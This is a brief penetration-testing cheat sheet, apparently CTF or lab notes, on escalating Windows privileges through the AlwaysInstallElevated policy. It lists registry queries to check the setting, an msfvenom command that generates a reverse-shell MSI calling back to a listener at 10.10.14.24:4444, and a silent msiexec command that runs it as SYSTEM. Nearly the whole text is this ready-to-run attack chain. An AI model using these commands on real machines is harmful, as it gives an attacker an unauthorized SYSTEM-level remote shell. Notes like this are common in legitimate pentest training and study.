**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) *.msi files as NT AUTHORITY\SYSTEM
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

OR

Check WinPEAS output and see if AlwaysInstallElevated is flagged out

### Generating the payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f msi -o reverse.msi ## CHANGE LHOST
```

### Executing MSI File
```
msiexec /quiet /qn /i reverse.msi
```